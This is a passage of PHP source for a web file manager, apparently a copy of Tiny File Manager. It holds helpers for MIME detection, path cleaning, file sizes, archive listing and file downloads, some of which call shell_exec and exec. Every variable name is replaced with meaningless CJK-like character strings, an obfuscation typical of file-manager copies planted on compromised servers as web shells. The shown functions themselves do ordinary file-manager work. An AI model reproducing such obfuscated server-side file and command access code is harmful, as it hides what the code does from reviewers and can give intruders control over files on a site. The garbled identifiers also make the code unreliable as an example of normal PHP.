 * Get mime type
 * @param string $file_path
 * @return mixed|string
 */
function fm_get_mime_type($粊銇堛粊畟沣硷併亖)
{
    if (function_exists('finfo_open')) {
        $慵銇愕曘銇併粊檨暡伡 = finfo_open(FILEINFO_MIME_TYPE);
        $伎沣倛垇︺傘銇沣亗 = finfo_file($慵銇愕曘銇併粊檨暡伡, $粊銇堛粊畟沣硷併亖);
        finfo_close($慵銇愕曘銇併粊檨暡伡);
        return $伎沣倛垇︺傘銇沣亗;
    } elseif (function_exists('mime_content_type')) {
        return mime_content_type($粊銇堛粊畟沣硷併亖);
    } elseif (!stristr(ini_get('disable_functions'), 'shell_exec')) {
        $慊銇愕仚剚亗焷獋亖銇 = escapeshellarg($粊銇堛粊畟沣硷併亖);
        $伎沣倛垇︺傘銇沣亗 = shell_exec('file -bi ' . $慊銇愕仚剚亗焷獋亖銇);
        return $伎沣倛垇︺傘銇沣亗;
    } else {
        return '--';
    }
}

/**
 * HTTP Redirect
 * @param string $url
 * @param int $code
 */
function fm_redirect($沣亗姇讣亪辑沣併亖沣, $伡紒侊亖仢銇飦夈傘 = 302)
{
    header('Location: ' . $沣亗姇讣亪辑沣併亖沣, true, $伡紒侊亖仢銇飦夈傘);
    exit;
}

/**
 * Path traversal prevention and clean the url
 * It replaces (consecutive) occurrences of / and \\ with whatever is in DIRECTORY_SEPARATOR, and processes /. and /.. fine.
 * @param $path
 * @return string
 */
function get_absolute_path($妶慵銇偛沣垇锛笺劜珓)
{
    $妶慵銇偛沣垇锛笺劜珓 = str_replace(array('/', '\\'), DIRECTORY_SEPARATOR, $妶慵銇偛沣垇锛笺劜珓);
    $笺亖飦愕锊亖勩亜傘 = array_filter(explode(DIRECTORY_SEPARATOR, $妶慵銇偛沣垇锛笺劜珓), 'strlen');
    $墎慵徏喛亖侊伝紓銏晛 = array();
    foreach ($笺亖飦愕锊亖勩亜傘 as $笺仾亖妴銇泔沣仾瞾勩) {
        if ('.' == $笺仾亖妴銇泔沣仾瞾勩) continue;
        if ('..' == $笺仾亖妴銇泔沣仾瞾勩) {
            array_pop($墎慵徏喛亖侊伝紓銏晛);
        } else {
            $墎慵徏喛亖侊伝紓銏晛[] = $笺仾亖妴銇泔沣仾瞾勩;
        }
    }
    return implode(DIRECTORY_SEPARATOR, $墎慵徏喛亖侊伝紓銏晛);
}

/**
 * Clean path
 * @param string $path
 * @return string
 */
function fm_clean_path($妶慵銇偛沣垇锛笺劜珓, $搞亖泔熂膊镲垈唫憧飩 = true)
{
    $妶慵銇偛沣垇锛笺劜珓 = $搞亖泔熂膊镲垈唫憧飩 ? trim($妶慵銇偛沣垇锛笺劜珓) : $妶慵銇偛沣垇锛笺劜珓;
    $妶慵銇偛沣垇锛笺劜珓 = trim($妶慵銇偛沣垇锛笺劜珓, '\\/');
    $妶慵銇偛沣垇锛笺劜珓 = str_replace(array('../', '..\\'), '', $妶慵銇偛沣垇锛笺劜珓);
    $妶慵銇偛沣垇锛笺劜珓 =  get_absolute_path($妶慵銇偛沣垇锛笺劜珓);
    if ($妶慵銇偛沣垇锛笺劜珓 == '..') {
        $妶慵銇偛沣垇锛笺劜珓 = '';
    }
    return str_replace('\\', '/', $妶慵銇偛沣垇锛笺劜珓);
}

/**
 * Get parent path
 * @param string $path
 * @return bool|string
 */
function fm_get_parent_path($妶慵銇偛沣垇锛笺劜珓)
{
    $妶慵銇偛沣垇锛笺劜珓 = fm_clean_path($妶慵銇偛沣垇锛笺劜珓);
    if ($妶慵銇偛沣垇锛笺劜珓 != '') {
        $亖伡俱銇併笺飦飰銊 = explode('/', $妶慵銇偛沣垇锛笺劜珓);
        if (count($亖伡俱銇併笺飦飰銊) > 1) {
            $亖伡俱銇併笺飦飰銊 = array_slice($亖伡俱銇併笺飦飰銊, 0, -1);
            return implode('/', $亖伡俱銇併笺飦飰銊);
        }
        return '';
    }
    return false;
}

function fm_get_display_path($粊銇堛粊畟沣硷併亖)
{
    global $剷飯銇銐併锛祱沣偦亞, $唩亖伂併銇併铿嗐笀級, $瑏焺慵锊沣侊劵亖偪伝;
    switch ($剷飯銇銐併锛祱沣偦亞) {
        case 'relative':
            return array(
                'label' => 'Path',
                'path' => fm_enc(fm_convert_win(str_replace($唩亖伂併銇併铿嗐笀級, '', $粊銇堛粊畟沣硷併亖)))
            );
        case 'host':
            $嗐緛埦偑沣倛亖锔妷 = str_replace($唩亖伂併銇併铿嗐笀級, '', $粊銇堛粊畟沣硷併亖);
            return array(
                'label' => 'Host Path',
                'path' => fm_enc(fm_convert_win('/' . $瑏焺慵锊沣侊劵亖偪伝 . '/' . ltrim(str_replace('\\', '/', $嗐緛埦偑沣倛亖锔妷), '/')))
            );
        case 'full':
        default:
            return array(
                'label' => 'Full Path',
                'path' => fm_enc(fm_convert_win($粊銇堛粊畟沣硷併亖))
            );
    }
}

/**
 * Check file is in exclude list
 * @param string $file
 * @return bool
 */
function fm_is_exclude_items($慊銇愕仚剚亗焷獋亖銇)
{
    $沣銈倐娿珎併墎壖併飦 = strtolower(pathinfo($慊銇愕仚剚亗焷獋亖銇, PATHINFO_EXTENSION));
    if (isset($銇撱愀傘銊憧︼傘勶惝) and sizeof($銇撱愀傘銊憧︼傘勶惝)) {
        unset($銇撱愀傘銊憧︼傘勶惝);
    }

    $銇撱愀傘銊憧︼傘勶惝 = FM_EXCLUDE_ITEMS;
    if (version_compare(PHP_VERSION, '7.0.0', '<')) {
        $銇撱愀傘銊憧︼傘勶惝 = unserialize($銇撱愀傘銊憧︼傘勶惝);
    }
    if (!in_array($慊銇愕仚剚亗焷獋亖銇, $銇撱愀傘銊憧︼傘勶惝) && !in_array("*.$沣銈倐娿珎併墎壖併飦", $銇撱愀傘銊憧︼傘勶惝)) {
        return true;
    }
    return false;
}

/**
 * get language translations from json file
 * @param int $tr
 * @return array
 */
function fm_get_translations($銇銇笺銑沣亞銈亴沣嗐)
{
    try {
        $銇飦銈焷櫙憔銏亯併慵 = @file_get_contents('translation.json');
        if ($銇飦銈焷櫙憔銏亯併慵 !== FALSE) {
            $伄沣晜倝夈仾垊镢层撱 = json_decode($銇飦銈焷櫙憔銏亯併慵, TRUE);
            global $銇沣勩銐銏沣偧銈镢慵;
            foreach ($伄沣晜倝夈仾垊镢层撱["language"] as $沣几紬镢紓銇亶銐銇 => $銇緛汇笺傦銌泔摽銈倛) {
                $伡紒侊亖仢銇飦夈傘 = $銇緛汇笺傦銌泔摽銈倛["code"];
                $銇沣勩銐銏沣偧銈镢慵[$伡紒侊亖仢銇飦夈傘] = $銇緛汇笺傦銌泔摽銈倛["name"];
                if ($銇銇笺銑沣亞銈亴沣嗐)
                    $銇銇笺銑沣亞銈亴沣嗐[$伡紒侊亖仢銇飦夈傘] = $銇緛汇笺傦銌泔摽銈倛["translation"];
            }
            return $銇銇笺銑沣亞銈亴沣嗐;
        }
    } catch (Exception $銇娿慵紙亖垇亞侊銈沣) {
        echo $銇娿慵紙亖垇亞侊銈沣;
    }
}

/**
 * @param string $file
 * Recover all file sizes larger than > 2GB.
 * Works on php 32bits and 64bits and supports linux
 * @return int|string
 */
function fm_get_size($慊銇愕仚剚亗焷獋亖銇)
{
    static $併併剭亖銇瞾銇埜勩銇 = null;
    static $併銇傘銇亪沣埇亖层餄 = null;
    static $Κ銊併伨伈沣亖笺 = null;

    // Set static variables once
    if ($併併剭亖銇瞾銇埜勩銇 === null) {
        $併併剭亖銇瞾銇埜勩銇 = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
        $併銇傘銇亪沣埇亖层餄 = strtoupper(PHP_OS) === 'DARWIN';
        $Κ銊併伨伈沣亖笺 = function_exists('exec') && !ini_get('safe_mode') && @exec('echo EXEC') === 'EXEC';
    }

    // Attempt shell command if exec is available
    if ($Κ銊併伨伈沣亖笺) {
        $亪沣伀堛欍悝镢倛侊飭 = escapeshellarg($慊銇愕仚剚亗焷獋亖銇);
        $刊亪淡瑏銇倎銇静亖慵 = $併併剭亖銇瞾銇埜勩銇 ? "for %F in (\"$慊銇愕仚剚亗焷獋亖銇\") do @echo %~zF" : ($併銇傘銇亪沣埇亖层餄 ? "stat -f%z $亪沣伀堛欍悝镢倛侊飭" : "stat -c%s $亪沣伀堛欍悝镢倛侊飭");
        @exec($刊亪淡瑏銇倎銇静亖慵, $潄沣垇嗐垑垐垇倓銇銈);

        if (!empty($潄沣垇嗐垑垐垇倓銇銈) && ctype_digit($倎沣镢飦亖壔垐剚亖笺 = trim(implode("\n", $潄沣垇嗐垑垐垇倓銇銈)))) {
            return $倎沣镢飦亖壔垐剚亖笺;
        }
    }

    // Attempt Windows COM interface for Windows systems
    if ($併併剭亖銇瞾銇埜勩銇 && class_exists('COM')) {
        try {
            $倎剚墎铴倎亜垇沣併勩 = new COM('Scripting.FileSystemObject');
            $镢傘銇点镢亖镢垇笺粡 = $倎剚墎铴倎亜垇沣併勩->GetFile(realpath($慊銇愕仚剚亗焷獋亖銇));
            if (ctype_digit($倎沣镢飦亖壔垐剚亖笺 = $镢傘銇点镢亖镢垇笺粡->Size)) {
                return $倎沣镢飦亖壔垐剚亖笺;
            }
        } catch (Exception $銇娿慵紙亖垇亞侊銈沣) {
            // COM failed, fallback to filesize
        }
    }

    // Default to PHP's filesize function
    return filesize($慊銇愕仚剚亗焷獋亖銇);
}


/**
 * Get nice filesize
 * @param int $size
 * @return string
 */
function fm_get_filesize($倎沣镢飦亖壔垐剚亖笺)
{
    $倎沣镢飦亖壔垐剚亖笺 = (float) $倎沣镢飦亖壔垐剚亖笺;
    $垇垈仸沣惘仾飦锆导獕 = array('B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
    $汇伈亖诧唩銇沣銏革岋 = ($倎沣镢飦亖壔垐剚亖笺 > 0) ? floor(log($倎沣镢飦亖壔垐剚亖笺, 1024)) : 0;
    $汇伈亖诧唩銇沣銏革岋 = ($汇伈亖诧唩銇沣銏革岋 > (count($垇垈仸沣惘仾飦锆导獕) - 1)) ? (count($垇垈仸沣惘仾飦锆导獕) - 1) : $汇伈亖诧唩銇沣銏革岋;
    return sprintf('%s %s', round($倎沣镢飦亖壔垐剚亖笺 / pow(1024, $汇伈亖诧唩銇沣銏革岋), 2), $垇垈仸沣惘仾飦锆导獕[$汇伈亖诧唩銇沣銏革岋]);
}

/**
 * Get info about zip archive
 * @param string $path
 * @return array|bool
 */
function fm_get_zif_info($妶慵銇偛沣垇锛笺劜珓, $沣銈倐娿珎併墎壖併飦)
{
    if ($沣銈倐娿珎併墎壖併飦 == 'zip' && function_exists('zip_open')) {
        $劶沣竵倛泔姫銈銏併 = @zip_open($妶慵銇偛沣垇锛笺劜珓);
        if ($劶沣竵倛泔姫銈銏併) {
            $搧倖倐併慊憧倐銇姯壆 = array();
            while ($亰紒垙伄垇銏銇伅沣 = @zip_read($劶沣竵倛泔姫銈銏併)) {
                $亖Ω銊亖硷飯棘慊沣 = @zip_entry_name($亰紒垙伄垇銏銇伅沣);
                $亖倎銇徏沣仸勩亯唵獘 = substr($亖Ω銊亖硷飯棘慊沣, -1) == '/';
                $搧倖倐併慊憧倐銇姯壆[] = array(
                    'name' => $亖Ω銊亖硷飯棘慊沣,
                    'filesize' => @zip_entry_filesize($亰紒垙伄垇銏銇伅沣),
                    'compressed_size' => @zip_entry_compressedsize($亰紒垙伄垇銏銇伅沣),
                    'folder' => $亖倎銇徏沣仸勩亯唵獘
                    //'compression_method' => zip_entry_compressionmethod($zip_entry),
                );
            }
            @zip_close($劶沣竵倛泔姫銈銏併);
            return $搧倖倐併慊憧倐銇姯壆;
        }
    } elseif ($沣銈倐娿珎併墎壖併飦 == 'tar' && class_exists('PharData')) {
        $锘俱銒墘劜墎併慵亯銐 = new PharData($妶慵銇偛沣垇锛笺劜珓);
        $搧倖倐併慊憧倐銇姯壆 = array();
        foreach (new RecursiveIteratorIterator($锘俱銒墘劜墎併慵亯銐) as $慊銇愕仚剚亗焷獋亖銇) {
            $凯姴镢併埣夈蓟紒层亞 = $慊銇愕仚剚亗焷獋亖銇->getPathInfo();
            $亖Ω銊亖硷飯棘慊沣 = str_replace("phar://" . $妶慵銇偛沣垇锛笺劜珓, '', $慊銇愕仚剚亗焷獋亖銇->getPathName());
            $亖Ω銊亖硷飯棘慊沣 = substr($亖Ω銊亖硷飯棘慊沣, ($镢技紒銜沣俱銇层寔飭 = strpos($亖Ω銊亖硷飯棘慊沣, '/')) !== false ? $镢技紒銜沣俱銇层寔飭 + 1 : 0);
            $亖倎銇徏沣仸勩亯唵獘 = $凯姴镢併埣夈蓟紒层亞->getFileName();
            $夈沣銇剤併竵沣銇併倎 = new SplFileInfo($慊銇愕仚剚亗焷獋亖銇);
            $搧倖倐併慊憧倐銇姯壆[] = array(
                'name' => $亖Ω銊亖硷飯棘慊沣,
                'filesize' => $夈沣銇剤併竵沣銇併倎->getSize(),
                'compressed_size' => $慊銇愕仚剚亗焷獋亖銇->getCompressedSize(),
                'folder' => $亖倎銇徏沣仸勩亯唵獘
            );
        }
        return $搧倖倐併慊憧倐銇姯壆;
    }
    return false;
}

/**
 * Encode html entities
 * @param string $text
 * @return string
 */
function fm_enc($紒伡锛澔剻愀併沣愀)
{
    return htmlspecialchars($紒伡锛澔剻愀併沣愀, ENT_QUOTES, 'UTF-8');
}

/**
 * Prevent XSS attacks
 * @param string $text
 * @return string
 */
function fm_isvalid_filename($紒伡锛澔剻愀併沣愀)
{
    return (strpbrk($紒伡锛澔剻愀併沣愀, '/?%*:|"<>') === FALSE) ? true : false;
}

/**
 * Save message in session
 * @param string $msg
 * @param string $status
 */
function fm_set_msg($傘嗐矈晞銊慵銈銏晜亖, $銞亖徏沣亜娿銇患倎倎 = 'ok')
{
    $_SESSION[FM_SESSION_ID]['message'] = $傘嗐矈晞銊慵銈銏晜亖;
    $_SESSION[FM_SESSION_ID]['status'] = $銞亖徏沣亜娿銇患倎倎;
}

/**
 * Check if string is in UTF-8
 * @param string $string
 * @return int
 */
function fm_is_utf8($併飦墎濓搞繊嬨伝瞾慵)
{
    return preg_match('//u', $併飦墎濓搞繊嬨伝瞾慵);
}

/**
 * Convert file name to UTF-8 in Windows
 * @param string $filename
 * @return string
 */
function fm_convert_win($愕紕沣泔併矒倎墎患伡)
{
    if (FM_IS_WIN && function_exists('iconv')) {
        $愕紕沣泔併矒倎墎患伡 = iconv(FM_ICONV_INPUT_ENC, 'UTF-8//IGNORE', $愕紕沣泔併矒倎墎患伡);
    }
    return $愕紕沣泔併矒倎墎患伡;
}

/**
 * @param $obj
 * @return array
 */
function fm_object_to_array($慊傘傘屻熴傘愀繄伈沣)
{
    if (!is_object($慊傘傘屻熴傘愀繄伈沣) && !is_array($慊傘傘屻熴傘愀繄伈沣)) {
        return $慊傘傘屻熴傘愀繄伈沣;
    }
    if (is_object($慊傘傘屻熴傘愀繄伈沣)) {
        $慊傘傘屻熴傘愀繄伈沣 = get_object_vars($慊傘傘屻熴傘愀繄伈沣);
    }
    return array_map('fm_object_to_array', $慊傘傘屻熴傘愀繄伈沣);
}

/**
 * Get CSS classname for file
 * @param string $path
 * @return string
 */
function fm_get_file_icon_class($妶慵銇偛沣垇锛笺劜珓)
{
    // get extension
    $沣銈倐娿珎併墎壖併飦 = strtolower(pathinfo($妶慵銇偛沣垇锛笺劜珓, PATHINFO_EXTENSION));

    switch ($沣銈倐娿珎併墎壖併飦) {
        case 'ico':
        case 'gif':
        case 'jpg':
        case 'jpeg':
        case 'jpc':
        case 'jp2':
        case 'jpx':
        case 'xbm':
        case 'wbmp':
        case 'png':
        case 'bmp':
        case 'tif':
        case 'tiff':
        case 'webp':
        case 'avif':
        case 'svg':
            $亪併亖劃伈妬獊层亗銊 = 'fa fa-picture-o';
            break;
        case 'passwd':
        case 'ftpquota':
        case 'sql':
        case 'js':
        case 'ts':
        case 'jsx':
        case 'tsx':
        case 'hbs':
        case 'json':
        case 'sh':
        case 'config':
        case 'twig':
        case 'tpl':
        case 'md':
        case 'gitignore':
        case 'c':
        case 'cpp':
        case 'cs':
        case 'py':
        case 'rs':
        case 'map':
        case 'lock':
        case 'dtd':
        case 'ps1':
            $亪併亖劃伈妬獊层亗銊 = 'fa fa-file-code-o';
            break;
        case 'txt':
        case 'ini':
        case 'conf':
        case 'log':
        case 'htaccess':
        case 'yaml':
        case 'yml':
        case 'toml':
        case 'tmp':
        case 'top':
        case 'bot':
        case 'dat':
        case 'bak':
        case 'htpasswd':
        case 'pl':
            $亪併亖劃伈妬獊层亗銊 = 'fa fa-file-text-o';
            break;
        case 'css':
        case 'less':
        case 'sass':
        case 'scss':
            $亪併亖劃伈妬獊层亗銊 = 'fa fa-css3';
            break;
        case 'bz2':
        case 'tbz2':
        case 'tbz':
        case 'zip':
        case 'rar':
        case 'gz':
        case 'tgz':
        case 'tar':
        case '7z':
        case 'xz':
        case 'txz':
        case 'zst':
        case 'tzst':
            $亪併亖劃伈妬獊层亗銊 = 'fa fa-file-archive-o';
            break;
        case 'php':
        case 'php4':
        case 'php5':
        case 'phps':
        case 'phtml':
            $亪併亖劃伈妬獊层亗銊 = 'fa fa-code';
            break;
        case 'htm':
        case 'html':
        case 'shtml':
        case 'xhtml':
            $亪併亖劃伈妬獊层亗銊 = 'fa fa-html5';
            break;
        case 'xml':
        case 'xsl':
            $亪併亖劃伈妬獊层亗銊 = 'fa fa-file-excel-o';
            break;
        case 'wav':
        case 'mp3':
        case 'mp2':
        case 'm4a':
        case 'aac':
        case 'ogg':
        case 'oga':
        case 'wma':
        case 'mka':
        case 'flac':
        case 'ac3':
        case 'tds':
            $亪併亖劃伈妬獊层亗銊 = 'fa fa-music';
            break;
        case 'm3u':
        case 'm3u8':
        case 'pls':
        case 'cue':
        case 'xspf':
            $亪併亖劃伈妬獊层亗銊 = 'fa fa-headphones';
            break;
        case 'avi':
        case 'mpg':
        case 'mpeg':
        case 'mp4':
        case 'm4v':
        case 'flv':
        case 'f4v':
        case 'ogm':
        case 'ogv':
        case 'mov':
        case 'mkv':
        case '3gp':
        case 'asf':
        case 'wmv':
        case 'webm':
            $亪併亖劃伈妬獊层亗銊 = 'fa fa-file-video-o';
            break;
        case 'eml':
        case 'msg':
            $亪併亖劃伈妬獊层亗銊 = 'fa fa-envelope-o';
            break;
        case 'xls':
        case 'xlsx':
        case 'ods':
            $亪併亖劃伈妬獊层亗銊 = 'fa fa-file-excel-o';
            break;
        case 'csv':
            $亪併亖劃伈妬獊层亗銊 = 'fa fa-file-text-o';
            break;
        case 'bak':
        case 'swp':
            $亪併亖劃伈妬獊层亗銊 = 'fa fa-clipboard';
            break;
        case 'doc':
        case 'docx':
        case 'odt':
            $亪併亖劃伈妬獊层亗銊 = 'fa fa-file-word-o';
            break;
        case 'ppt':
        case 'pptx':
            $亪併亖劃伈妬獊层亗銊 = 'fa fa-file-powerpoint-o';
            break;
        case 'ttf':
        case 'ttc':
        case 'otf':
        case 'woff':
        case 'woff2':
        case 'eot':
        case 'fon':
            $亪併亖劃伈妬獊层亗銊 = 'fa fa-font';
            break;
        case 'pdf':
            $亪併亖劃伈妬獊层亗銊 = 'fa fa-file-pdf-o';
            break;
        case 'psd':
        case 'ai':
        case 'eps':
        case 'fla':
        case 'swf':
            $亪併亖劃伈妬獊层亗銊 = 'fa fa-file-image-o';
            break;
        case 'exe':
        case 'msi':
            $亪併亖劃伈妬獊层亗銊 = 'fa fa-file-o';
            break;
        case 'bat':
            $亪併亖劃伈妬獊层亗銊 = 'fa fa-terminal';
            break;
        default:
            $亪併亖劃伈妬獊层亗銊 = 'fa fa-info-circle';
    }

    return $亪併亖劃伈妬獊层亗銊;
}

/**
 * Get image files extensions
 * @return array
 */
function fm_get_image_exts()
{
    return array('ico', 'gif', 'jpg', 'jpeg', 'jpc', 'jp2', 'jpx', 'xbm', 'wbmp', 'png', 'bmp', 'tif', 'tiff', 'psd', 'svg', 'webp', 'avif');
}

/**
 * Get video files extensions
 * @return array
 */
function fm_get_video_exts()
{
    return array('avi', 'webm', 'wmv', 'mp4', 'm4v', 'ogm', 'ogv', 'mov', 'mkv');
}

/**
 * Get audio files extensions
 * @return array
 */
function fm_get_audio_exts()
{
    return array('wav', 'mp3', 'ogg', 'm4a');
}

/**
 * Get text file extensions
 * @return array
 */
function fm_get_text_exts()
{
    return array(
        'txt',
        'css',
        'ini',
        'conf',
        'log',
        'htaccess',
        'passwd',
        'ftpquota',
        'sql',
        'js',
        'ts',
        'jsx',
        'tsx',
        'mjs',
        'json',
        'sh',
        'config',
        'php',
        'php4',
        'php5',
        'phps',
        'phtml',
        'htm',
        'html',
        'shtml',
        'xhtml',
        'xml',
        'xsl',
        'm3u',
        'm3u8',
        'pls',
        'cue',
        'bash',
        'vue',
        'eml',
        'msg',
        'csv',
        'bat',
        'twig',
        'tpl',
        'md',
        'gitignore',
        'less',
        'sass',
        'scss',
        'c',
        'cpp',
        'cs',
        'py',
        'go',
        'zsh',
        'swift',
        'map',
        'lock',
        'dtd',
        'svg',
        'asp',
        'aspx',
        'asx',
        'asmx',
        'ashx',
        'jsp',
        'jspx',
        'cgi',
        'dockerfile',
        'ruby',
        'yml',
        'yaml',
        'toml',
        'vhost',
        'scpt',
        'applescript',
        'csx',
        'cshtml',
        'c++',
        'coffee',
        'cfm',
        'rb',
        'graphql',
        'mustache',
        'jinja',
        'http',
        'handlebars',
        'java',
        'es',
        'es6',
        'markdown',
        'wiki',
        'tmp',
        'top',
        'bot',
        'dat',
        'bak',
        'htpasswd',
        'pl',
        'ps1'
    );
}

/**
 * Get mime types of text files
 * @return array
 */
function fm_get_text_mimes()
{
    return array(
        'application/xml',
        'application/javascript',
        'application/x-javascript',
        'image/svg+xml',
        'message/rfc822',
        'application/json',
    );
}

/**
 * Get file names of text files w/o extensions
 * @return array
 */
function fm_get_text_names()
{
    return array(
        'license',
        'readme',
        'authors',
        'contributors',
        'changelog',
    );
}

/**
 * Get online docs viewer supported files extensions
 * @return array
 */
function fm_get_onlineViewer_exts()
{
    return array('doc', 'docx', 'xls', 'xlsx', 'pdf', 'ppt', 'pptx', 'ai', 'psd', 'dxf', 'xps', 'rar', 'odt', 'ods');
}

/**
 * It returns the mime type of a file based on its extension.
 * @param extension The file extension of the file you want to get the mime type for.
 * @return string|string[] The mime type of the file.
 */
function fm_get_file_mimes($銊銇級吉伕銠沣镲)
{
    $銐沣堬慵堛紗銈併銠銚['swf'] = 'application/x-shockwave-flash';
    $銐沣堬慵堛紗銈併銠銚['pdf'] = 'application/pdf';
    $銐沣堬慵堛紗銈併銠銚['exe'] = 'application/octet-stream';
    $銐沣堬慵堛紗銈併銠銚['zip'] = 'application/zip';
    $銐沣堬慵堛紗銈併銠銚['doc'] = 'application/msword';
    $銐沣堬慵堛紗銈併銠銚['xls'] = 'application/vnd.ms-excel';
    $銐沣堬慵堛紗銈併銠銚['ppt'] = 'application/vnd.ms-powerpoint';
    $銐沣堬慵堛紗銈併銠銚['gif'] = 'image/gif';
    $銐沣堬慵堛紗銈併銠銚['png'] = 'image/png';
    $銐沣堬慵堛紗銈併銠銚['jpeg'] = 'image/jpg';
    $銐沣堬慵堛紗銈併銠銚['jpg'] = 'image/jpg';
    $銐沣堬慵堛紗銈併銠銚['webp'] = 'image/webp';
    $銐沣堬慵堛紗銈併銠銚['avif'] = 'image/avif';
    $銐沣堬慵堛紗銈併銠銚['rar'] = 'application/rar';

    $銐沣堬慵堛紗銈併銠銚['ra'] = 'audio/x-pn-realaudio';
    $銐沣堬慵堛紗銈併銠銚['ram'] = 'audio/x-pn-realaudio';
    $銐沣堬慵堛紗銈併銠銚['ogg'] = 'audio/x-pn-realaudio';

    $銐沣堬慵堛紗銈併銠銚['wav'] = 'video/x-msvideo';
    $銐沣堬慵堛紗銈併銠銚['wmv'] = 'video/x-msvideo';
    $銐沣堬慵堛紗銈併銠銚['avi'] = 'video/x-msvideo';
    $銐沣堬慵堛紗銈併銠銚['asf'] = 'video/x-msvideo';
    $銐沣堬慵堛紗銈併銠銚['divx'] = 'video/x-msvideo';

    $銐沣堬慵堛紗銈併銠銚['mp3'] = 'audio/mpeg';
    $銐沣堬慵堛紗銈併銠銚['mp4'] = 'audio/mpeg';
    $銐沣堬慵堛紗銈併銠銚['mpeg'] = 'video/mpeg';
    $銐沣堬慵堛紗銈併銠銚['mpg'] = 'video/mpeg';
    $銐沣堬慵堛紗銈併銠銚['mpe'] = 'video/mpeg';
    $銐沣堬慵堛紗銈併銠銚['mov'] = 'video/quicktime';
    $銐沣堬慵堛紗銈併銠銚['swf'] = 'video/quicktime';
    $銐沣堬慵堛紗銈併銠銚['3gp'] = 'video/quicktime';
    $銐沣堬慵堛紗銈併銠銚['m4a'] = 'video/quicktime';
    $銐沣堬慵堛紗銈併銠銚['aac'] = 'video/quicktime';
    $銐沣堬慵堛紗銈併銠銚['m3u'] = 'video/quicktime';

    $銐沣堬慵堛紗銈併銠銚['php'] = ['application/x-php'];
    $銐沣堬慵堛紗銈併銠銚['html'] = ['text/html'];
    $銐沣堬慵堛紗銈併銠銚['txt'] = ['text/plain'];
    //Unknown mime-types should be 'application/octet-stream'
    if (empty($銐沣堬慵堛紗銈併銠銚[$銊銇級吉伕銠沣镲])) {
        $銐沣堬慵堛紗銈併銠銚[$銊銇級吉伕銠沣镲] = ['application/octet-stream'];
    }
    return $銐沣堬慵堛紗銈併銠銚[$銊銇級吉伕銠沣镲];
}

/**
 * This function scans the files and folder recursively, and return matching files
 * @param string $dir
 * @param string $filter
 * @return array|null
 */
function scan($沣亖嫮併夈沣併紒汇銐 = '', $伡併亞銦瞾垇泔沣 = '')
{
    $妶慵銇偛沣垇锛笺劜珓 = FM_ROOT_PATH . '/' . $沣亖嫮併夈沣併紒汇銐;
    if ($妶慵銇偛沣垇锛笺劜珓) {
        $銇壖沣堬泔飦泔亜銑 = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($妶慵銇偛沣垇锛笺劜珓));
        $併銇沣沣沣倎併潽亯导 = new RegexIterator($銇壖沣堬泔飦泔亜銑, "/(" . $伡併亞銦瞾垇泔沣 . ")/i");

        $飩併伡併銖慊傘壖銇亗 = array();
        foreach ($併銇沣沣沣倎併潽亯导 as $慊銇愕仚剚亗焷獋亖銇) {
            if (!$慊銇愕仚剚亗焷獋亖銇->isDir()) {
                $併埅唩劃岋倞飫亯唩沣 = $慊銇愕仚剚亗焷獋亖銇->getFilename();
                $娿銈銇倎銊亖啰銊搞悴 = str_replace(FM_ROOT_PATH, '', $慊銇愕仚剚亗焷獋亖銇->getPath());
                $飩併伡併銖慊傘壖銇亗[] = array(
                    "name" => $併埅唩劃岋倞飫亯唩沣,
                    "type" => "file",
                    "path" => $娿銈銇倎銊亖啰銊搞悴,
                );
            }
        }
        return $飩併伡併銖慊傘壖銇亗;
    }
}

/**
 * Parameters: downloadFile(File Location, File Name,
 * max speed, is streaming
 * If streaming - videos will show as videos, images as images
 * instead of download prompt
 * https://stackoverflow.com/a/13821992/1164642
 */
function fm_download_file($伩悛镲亖讣銇嗭嶃亖暛, $併埅唩劃岋倞飫亯唩沣, $亖傘镢沣亖垗沣嗐銈堛  = 1024)
{
    if (connection_status() != 0)
        return (false);
    $銊銇級吉伕銠沣镲 = pathinfo($併埅唩劃岋倞飫亯唩沣, PATHINFO_EXTENSION);

    $镢偊銇搲悱瑏銊层勩銇 = fm_get_file_mimes($銊銇級吉伕銠沣镲);

    if (is_array($镢偊銇搲悱瑏銊层勩銇)) {
        $镢偊銇搲悱瑏銊层勩銇 = implode(' ', $镢偊銇搲悱瑏銊层勩銇);
    }

    $倎沣镢飦亖壔垐剚亖笺 = filesize($伩悛镲亖讣銇嗭嶃亖暛);

    if ($倎沣镢飦亖壔垐剚亖笺 == 0) {
        fm_set_msg(lng('Zero byte file! Aborting download'), 'error');
        $偊沣銇傘堛墎愀亪垇伎 = FM_PATH;
        fm_redirect(FM_SELF_URL . '?p=' . urlencode($偊沣銇傘堛墎愀亪垇伎));

        return (false);
    }

    @ini_set('magic_quotes_runtime', 0);
    $潖紒慊堬傘飩倎镢併倎 = fopen("$伩悛镲亖讣銇嗭嶃亖暛", "rb");

    if ($潖紒慊堬傘飩倎镢併倎 === false) {
        fm_set_msg(lng('Cannot open file! Aborting download'), 'error');
        $偊沣銇傘堛墎愀亪垇伎 = FM_PATH;
        fm_redirect(FM_SELF_URL . '?p=' . urlencode($偊沣銇傘堛墎愀亪垇伎));
        return (false);
    }

    // headers
    header('Content-Description: File Transfer');
    header('Expires: 0');
    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
    header('Pragma: public');
    header("Content-Transfer-Encoding: binary");
    header("Content-Type: $镢偊銇搲悱瑏銊层勩銇");

    $嗐沣併亖併檨沣銇嗐倐 = 'attachment';

    if (strstr($_SERVER['HTTP_USER_AGENT'], "MSIE")) {
        $併埅唩劃岋倞飫亯唩沣 = preg_replace('/\./', '%2e', $併埅唩劃岋倞飫亯唩沣, substr_count($併埅唩劃岋倞飫亯唩沣, '.') - 1);
        header("Content-Disposition: $嗐沣併亖併檨沣銇嗐倐;filename=\"$併埅唩劃岋倞飫亯唩沣\"");
    } else {
        header("Content-Disposition: $嗐沣併亖併檨沣銇嗐倐;filename=\"$併埅唩劃岋倞飫亯唩沣\"");
    }

    header("Accept-Ranges: bytes");
    $剚級銇沣併併伩紞唸併 = 0;

    if (isset($_SERVER['HTTP_RANGE'])) {
        list($嗐併倝傘搞銇仌倎銇媮, $剚級銇沣併併伩紞唸併) = explode("=", $_SERVER['HTTP_RANGE']);
        str_replace($剚級銇沣併併伩紞唸併, "-", $剚級銇沣併併伩紞唸併);
        $裤层勩銐埣唹亖欍亖笺 = $倎沣镢飦亖壔垐剚亖笺 - 1;
